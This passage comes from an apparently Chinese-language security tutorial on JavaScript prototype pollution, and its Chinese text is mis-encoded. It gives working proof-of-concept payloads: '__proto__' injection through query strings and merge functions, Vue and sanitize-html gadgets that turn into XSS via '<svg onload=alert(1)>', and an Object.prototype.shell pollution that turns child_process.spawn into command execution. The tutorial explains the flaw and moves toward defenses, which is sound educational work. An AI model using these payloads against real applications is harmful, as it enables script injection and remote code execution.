é•·é€™æ¨£ï¼Œäº‹æƒ…å°±ä¸ä¸€æ¨£äº†ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> qs <span class=\"token operator\">=</span> <span class=\"token function\">parseQs</span><span class=\"token punctuation\">(</span><span class=\"token string\">'__proto__[a]=3'</span><span class=\"token punctuation\">)</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>qs<span class=\"token punctuation\">)</span> <span class=\"token comment\">// {}</span><br><br><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 3</span></code></pre>\n<p>ç•¶æˆ‘çš„ query string æ˜¯é€™æ¨£çš„æ™‚å€™ï¼Œ<code>parseQs</code> å°±æœƒå»æ”¹è®Š <code>obj.__proto__.a</code> çš„å€¼ï¼Œé€ æˆäº† prototype pollutionï¼Œå°è‡´æˆ‘å¾Œä¾†å®£å‘Šä¸€å€‹ç©ºçš„ç‰©ä»¶ï¼Œåœ¨å°å‡º <code>obj.a</code> çš„æ™‚å€™å»å°å‡ºäº† 3ï¼Œå› ç‚ºç‰©ä»¶åŸå‹å·²ç¶“è¢«æ±¡æŸ“äº†ã€‚</p>\n<p>æœ‰ä¸å°‘åœ¨è§£æ query string çš„ library éƒ½å‡ºéé¡ä¼¼çš„å•é¡Œï¼Œåº•ä¸‹ç°¡å–®èˆ‰å¹¾å€‹ä¾‹å­ï¼š</p>\n<ol>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-JQUERYDEPARAM-1255651\">jquery-deparam</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-BACKBONEQUERYPARAMETERS-1290381\">backbone-query-parameters</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-JQUERYQUERYOBJECT-1255650\">jquery-query-object</a></li>\n</ol>\n<p>é™¤äº†è§£æ query string ä»¥å¤–ï¼Œå¦ä¸€å€‹åŠŸèƒ½ä¹Ÿå¾ˆå¸¸ç™¼ç”Ÿé€™å€‹å•é¡Œï¼Œå«åšåˆä½µç‰©ä»¶ï¼Œä¸€å€‹ç°¡å–®çš„åˆä½µç‰©ä»¶å‡½å¼é•·å¾—åƒé€™æ¨£ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">a<span class=\"token punctuation\">,</span> b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> prop <span class=\"token keyword\">in</span> b<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> a<span class=\"token punctuation\">[</span>prop<span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string\">'object'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>prop<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">[</span>prop<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>      a<span class=\"token punctuation\">[</span>prop<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> b<span class=\"token punctuation\">[</span>prop<span class=\"token punctuation\">]</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span> <br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">var</span> config <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><br>  b<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>    c<span class=\"token operator\">:</span> <span class=\"token number\">2</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">var</span> customConfig <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  b<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>    d<span class=\"token operator\">:</span> <span class=\"token number\">3</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">,</span> customConfig<span class=\"token punctuation\">)</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span><br><span class=\"token comment\">// { a: 1, b: { c: 2, d: 3 } }</span></code></pre>\n<p>å¦‚æœä¸Šé¢çš„ <code>customConfig</code> æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œé‚£å°±æœƒç™¼ç”Ÿå•é¡Œï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> config <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><br>  b<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>    c<span class=\"token operator\">:</span> <span class=\"token number\">2</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">var</span> customConfig <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{\"__proto__\": {\"a\": 1}}'</span><span class=\"token punctuation\">)</span><br><span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">,</span> customConfig<span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span></code></pre>\n<p>é€™é‚Šä¹‹æ‰€ä»¥ç”¨åˆ° <code>JSON.parse</code>ï¼Œæ˜¯å› ç‚ºå¦‚æœç›´æ¥å¯«ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> customConfig <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  __proto__<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>    a<span class=\"token operator\">:</span> <span class=\"token number\">1</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>æ˜¯æ²’æœ‰ç”¨çš„ï¼Œ<code>customConfig</code> åªæœƒæ˜¯ä¸€å€‹ç©ºç‰©ä»¶è€Œå·²ã€‚è¦ç”¨ <code>JSON.parse</code>ï¼Œæ‰èƒ½è£½é€ å‡ºä¸€å€‹ã€Œkey æ˜¯ <code>__proto__</code>ã€çš„ç‰©ä»¶ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> obj1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  __proto__<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>    a<span class=\"token operator\">:</span> <span class=\"token number\">1</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><span class=\"token keyword\">var</span> obj2 <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{\"__proto__\": {\"a\": 1}}'</span><span class=\"token punctuation\">)</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj1<span class=\"token punctuation\">)</span> <span class=\"token comment\">// {}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj2<span class=\"token punctuation\">)</span> <span class=\"token comment\">// { __proto__: { a: 1 } }</span></code></pre>\n<p>åŒæ¨£åœ°ï¼Œä¹Ÿæœ‰è¨±å¤š merge ç›¸é—œçš„ library æ›¾ç¶“æœ‰é€™å€‹æ¼æ´ï¼Œåº•ä¸‹ç°¡å–®åˆ—èˆ‰å¹¾å€‹ï¼š</p>\n<ol>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-MERGE-1040469\">merge</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-LODASHMERGE-173733\">lodash.merge</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-PLAINOBJECTMERGE-1085643\">plain-object-merge </a></li>\n</ol>\n<p>é™¤äº†é€™äº›ä»¥å¤–ï¼Œåªè¦æ˜¯æ“ä½œç‰©ä»¶ç›¸é—œçš„ library åŸºæœ¬ä¸Šéƒ½å‡ºç¾éé¡ä¼¼å•é¡Œï¼Œåƒæ˜¯ï¼š</p>\n<ol>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-IMMER-1019369\">immer</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536\">mootools</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-IOREDIS-1567196\">ioredis</a></li>\n</ol>\n<p>ç¾åœ¨å·²ç¶“çŸ¥é“å“ªäº›åœ°æ–¹å®¹æ˜“ç™¼ç”Ÿ prototype pollution çš„å•é¡Œäº†ï¼Œä½†å¦‚æœåªæ˜¯æ±¡æŸ“åŸå‹ä¸Šçš„å±¬æ€§ï¼Œæ˜¯æ²’æœ‰ç”¨çš„ï¼Œé‚„éœ€è¦æ‰¾åˆ°èƒ½å½±éŸ¿åˆ°çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œæœ‰å“ªäº›åœ°æ–¹åœ¨å±¬æ€§è¢«æ±¡æŸ“ä»¥å¾Œï¼Œè¡Œç‚ºæœƒæ”¹è®Šï¼Œå¯ä»¥è®“æˆ‘å€‘åŸ·è¡Œæ”»æ“Šï¼Ÿ</p>\n<h2 id=\"prototype-pollution-script-gadgets\"><a class=\"direct-link\" href=\"#prototype-pollution-script-gadgets\">#</a> Prototype pollution script gadgets</h2>\n<p>é€™äº›ã€Œåªè¦æˆ‘å€‘æ±¡æŸ“äº† prototypeï¼Œå°±å¯ä»¥æ‹¿ä¾†åˆ©ç”¨çš„ç¨‹å¼ç¢¼ã€å«åš script gadgetï¼Œæœ‰ä¸€å€‹ GitHub repo å°ˆé–€æœé›†äº†é€™äº› gadgetï¼š<a href=\"https://github.com/BlackFan/client-side-prototype-pollution\">Client-Side Prototype Pollution</a>ï¼Œæœ‰äº› gadget å¯èƒ½æ˜¯ä½ æƒ³åƒä¸åˆ°çš„ï¼Œæˆ‘ä¾†ç¤ºç¯„ä¸€ä¸‹ï¼ˆ<a href=\"https://aszx87410.github.io/demo/prototype-pollution/vue.html\">demo ç¶²é </a>ï¼‰ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://unpkg.com/vue/dist/vue.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>    <br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>    <span class=\"token comment\">// æ±¡æŸ“ template</span><br>    <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>template <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;svg onload=alert(1)>&lt;/svg>'</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> <br>      el<span class=\"token operator\">:</span> <span class=\"token string\">'#app'</span><span class=\"token punctuation\">,</span><br>      data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>        message<span class=\"token operator\">:</span> <span class=\"token string\">'Hello Vue!'</span><br>      <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>ä¸€æ®µçœ‹èµ·ä¾†æ²’ä»€éº¼çš„ Vue hello worldï¼Œåœ¨æˆ‘å€‘æ±¡æŸ“äº† <code>Object.prototype.template</code> ä¹‹å¾Œï¼Œå°±è®Šæˆäº† XSSï¼Œå¯ä»¥è®“æˆ‘å€‘æ’å…¥ä»»æ„ç¨‹å¼ç¢¼ã€‚</p>\n<p>æˆ–æ˜¯åƒä¸‹é¢é€™æ¨£ï¼ˆ<a href=\"https://aszx87410.github.io/demo/prototype-pollution/vue.html\">demo ç¶²é </a>ï¼‰ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>    <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>innerText <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;svg onload=alert(1)>&lt;/svg>'</span><span class=\"token punctuation\">;</span><br>    document<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token function\">sanitizeHtml</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;div>hello&lt;/div>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br>  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>æ˜æ˜æ˜¯åš sanitize çš„ libraryï¼Œåœ¨æ±¡æŸ“äº† <code>Object.prototype.innerText</code> ä¹‹å¾Œï¼Œå°±è®Šæˆäº† XSS çš„å¥½å¹«æ‰‹ã€‚</p>\n<p>ç‚ºä»€éº¼æœƒæœ‰é€™äº›å•é¡Œå‡ºç¾å‘¢ï¼Ÿä»¥ä¸Šé¢çš„ <code>sanitize-html</code> ç‚ºä¾‹ï¼Œæ˜¯å› ç‚ºæœ‰é€™ä¸€æ®µç¨‹å¼ç¢¼ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>frame<span class=\"token punctuation\">.</span>innerText <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>hasText <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>options<span class=\"token punctuation\">.</span>textFilter<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    result <span class=\"token operator\">+=</span> frame<span class=\"token punctuation\">.</span>innerText<span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>å› ç‚ºç›´æ¥é è¨­äº† innerText æ˜¯å®‰å…¨çš„å­—ä¸²ï¼Œæ‰€ä»¥å°±ç›´æ¥æ‹¼æ¥ä¸Šå»ï¼Œè€Œæˆ‘å€‘æ±¡æŸ“äº†é€™å€‹å±¬æ€§ï¼Œå› æ­¤ç•¶é€™å€‹å±¬æ€§ä¸å­˜åœ¨æ™‚ï¼Œå°±æœƒç”¨åˆ° prototype çš„å€¼ï¼Œæœ€å¾Œè®Šæˆäº† XSSã€‚</p>\n<p>é™¤äº† client side ä»¥å¤–ï¼Œserver side çš„ Node.js ä¹Ÿæœ‰é¡ä¼¼çš„é¢¨éšªï¼Œä¾‹å¦‚èªªé€™æ¨£ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> child_process <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">const</span> params <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'123'</span><span class=\"token punctuation\">]</span><br><span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> child_process<span class=\"token punctuation\">.</span><span class=\"token function\">spawnSync</span><span class=\"token punctuation\">(</span><br>  <span class=\"token string\">'echo'</span><span class=\"token punctuation\">,</span> params<br><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 123</span></code></pre>\n<p>é€™æ˜¯ä¸€æ®µå¾ˆå–®ç´”çš„ç¨‹å¼ç¢¼ï¼ŒåŸ·è¡Œ <code>echo</code> æŒ‡ä»¤ç„¶å¾Œå‚³å…¥åƒæ•¸ï¼Œé€™å€‹åƒæ•¸æœƒè‡ªå‹•å¹«ä½ åšè™•ç†ï¼Œæ‰€ä»¥ä¸ç”¨æ“”å¿ƒ command injection çš„å•é¡Œï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> child_process <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">const</span> params <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'123 &amp;&amp; ls'</span><span class=\"token punctuation\">]</span><br><span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> child_process<span class=\"token punctuation\">.</span><span class=\"token function\">spawnSync</span><span class=\"token punctuation\">(</span><br>  <span class=\"token string\">'echo'</span><span class=\"token punctuation\">,</span> params<br><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 123 &amp;&amp; ls</span></code></pre>\n<p>ä½†å¦‚æœæœ‰ä¸€å€‹ prototype pollution çš„æ¼æ´ï¼Œå°±å¯ä»¥æ–èº«ä¸€è®Šæˆç‚º RCEï¼ˆRemote code executionï¼‰ï¼Œè®“æ”»æ“Šè€…åŸ·è¡Œä»»æ„æŒ‡ä»¤ï¼ˆå‡è¨­æ”»æ“Šè€…å¯ä»¥æ§åˆ¶ paramsï¼‰ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> child_process <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">const</span> params <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'123 &amp;&amp; ls'</span><span class=\"token punctuation\">]</span><br><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>shell <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span> <span class=\"token comment\">// åªå¤šäº†é€™è¡Œï¼Œåƒæ•¸çš„è§£æå°±æœƒä¸ä¸€æ¨£</span><br><span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> child_process<span class=\"token punctuation\">.</span><span class=\"token function\">spawnSync</span><span class=\"token punctuation\">(</span><br>  <span class=\"token string\">'echo'</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>timeout<span class=\"token operator\">:</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><span class=\"token comment\">/*<br>123<br>index.js<br>node_modules<br>package-lock.json<br>package.json<br>*/</span></code></pre>\n<p>ä¹‹æ‰€ä»¥æœƒé€™æ¨£ï¼Œæ˜¯å› ç‚º <code>child_process.spawn</code> çš„ç¬¬ä¸‰å€‹åƒæ•¸ options ä¸­æœ‰ä¸€å€‹é¸é …å«åš <code>shell</code>ï¼Œè¨­ç‚º true ä»¥å¾Œæœƒé€ æˆè¡Œç‚ºä¸åŒï¼Œè€Œå®˜ç¶²çš„<a href=\"https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options\">æ–‡ä»¶</a>ä¹Ÿæœ‰å¯«èªªï¼š</p>\n<blockquote>\n<p>If the shell option is enabled, do not pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution.</p>\n</blockquote>\n<p>é€é prototype pollution æ­é… script gadgetï¼ˆ<code>child_process.spawn</code>ï¼‰ï¼ŒæˆåŠŸè£½é€ å‡ºä¸€å€‹åš´é‡æ€§æ¥µé«˜çš„æ¼æ´ã€‚</p>\n<h2 id=\"%E4%B8%AD%E5%A0%B4%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E4%B8%AD%E5%A0%B4%E7%B8%BD%E7%B5%90\">#</a> ä¸­å ´ç¸½çµ</h2>\n<p>å¦‚æœç¨‹å¼ä¸­å­˜åœ¨æŸå€‹åŠŸèƒ½ï¼Œèƒ½è®“æ”»æ“Šè€…æ±¡æŸ“åˆ° prototype ä¸Šé¢çš„å±¬æ€§ï¼Œé€™å€‹æ¼æ´å°±å«åš prototype pollutionï¼Œè€Œ prototype pollution æœ¬èº«ç”¨é€”ä¸å¤§ï¼Œéœ€è¦è·Ÿå…¶ä»–çš„ç¨‹å¼ç¢¼çµåˆæ‰èƒ½ç™¼æ®ä½œç”¨ï¼Œè€Œå¯ä»¥è·Ÿä»–çµåˆçš„ç¨‹å¼ç¢¼å°±å«åš script gadgetã€‚</p>\n<p>ä¾‹å¦‚èªª Vue çš„å…§éƒ¨å¯¦ä½œæœƒæ ¹æ“šæŸå€‹ç‰©ä»¶çš„ <code>template</code> é€™å€‹å±¬æ€§æ¸²æŸ“å‡ºç›¸å°æ‡‰çš„æ±è¥¿ï¼Œæ–¼æ˜¯æˆ‘å€‘åªè¦æ±¡æŸ“ <code>Object.prototype.template</code>ï¼Œå°±å¯ä»¥è£½é€ å‡ºä¸€å€‹ XSS æ¼æ´ã€‚æˆ–åƒæ˜¯ <code>child_process.spawn</code> ç”¨åˆ°äº† <code>shell</code>ï¼Œæ‰€ä»¥æ±¡æŸ“å®ƒä»¥å¾Œå°±è®Šæˆäº† RCE æ¼æ´ã€‚</p>\n<p>è¦ä¿®å¾©çš„å…¶å¯¦ä¸¦ä¸æ˜¯é‚£äº›å¯ä»¥åˆ©ç”¨çš„ script gadgetï¼Œé™¤éä½ æŠŠæ¯å€‹ç‰©ä»¶å–å€¼çš„åœ°æ–¹éƒ½æ”¹æ‰ï¼Œä½†é€™å…¶å¯¦ä¹Ÿä¸æ˜¯æ ¹æ²»çš„æ–¹å¼ã€‚çœŸæ­£æ ¹æ²»çš„æ–¹å¼ï¼Œæ˜¯æœçµ•æ‰ prototype pollutionï¼Œè®“ prototype ä¸æœƒè¢«æ±¡æŸ“ï¼Œå°±æ²’æœ‰é€™äº›å•é¡Œäº†ã€‚</p>\n<h2 id=\"%E8%A9%B2%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6\"><a class=\"direct-link\" href=\"#%E8%A9%B2%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6\">#</a> è©²å¦‚ä½•é˜²ç¦¦</h2>\n<p>åœ¨ <a href=\"https://snyk.io/vuln/SNYK-JS-SWIPER-1088062\">snyk</a> çš„ä»»ä½•ä¸€å€‹ prototype pollution æ¼æ´é é¢ä¸Šéƒ½æœƒæœ‰é˜²ç¦¦å»ºè­°ï¼Œä¹Ÿå¯ä»¥åƒè€ƒé€™ä¸€ç¯‡ï¼š<a href=\"https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf\">Prototype pollution attack in NodeJS application</a></p>\n<p>å¸¸è¦‹çš„é˜²ç¦¦æ–¹å¼æœ‰å¹¾ç¨®ï¼Œç¬¬ä¸€ç¨®æ˜¯åœ¨åšé€™äº›ç‰©ä»¶çš„æ“ä½œæ™‚ï¼Œé˜»æ­¢ <code>__proto__</code> é€™å€‹ keyï¼Œä¾‹å¦‚èªªå‰é¢æåˆ°çš„è§£æ query string è·Ÿ merge object éƒ½å¯ä»¥æ¡ç”¨é€™å€‹æ–¹å¼ã€‚</p>\n<p>ä½†æ˜¯é™¤äº† 